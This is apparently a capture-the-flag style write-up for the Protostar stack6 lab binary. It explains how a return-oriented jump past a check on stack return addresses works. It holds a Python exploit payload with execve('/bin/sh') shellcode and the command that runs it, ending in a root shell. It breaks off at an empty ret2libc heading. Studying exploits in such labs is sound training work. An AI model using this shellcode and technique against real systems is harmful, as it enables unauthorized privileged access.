There are three suggested methods for solving this problem, each of which is shown below.

# Return orientated programming:
Since the program restricts returning to the stack (exiting the program if the return address falls within the stack address range), return orientated programmming returns to a return instruction. Since the EIP is back at a return instruction again, it looks for a return address in the stack again. This return address will not be checked, so it can point to the stack.
```python
print("".join([chr(i)*4 for i in range(65, 85)]) + '\x08\x85\x04\x08'+'\xc0\xf7\xff\xbf'+'\x90'*36+'\x31\xc0\
x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80')
```

```shell
(python /tmp/stack6.py; cat) | /opt/protostar/bin/stack6
whoami
root
```

# ret2libc:
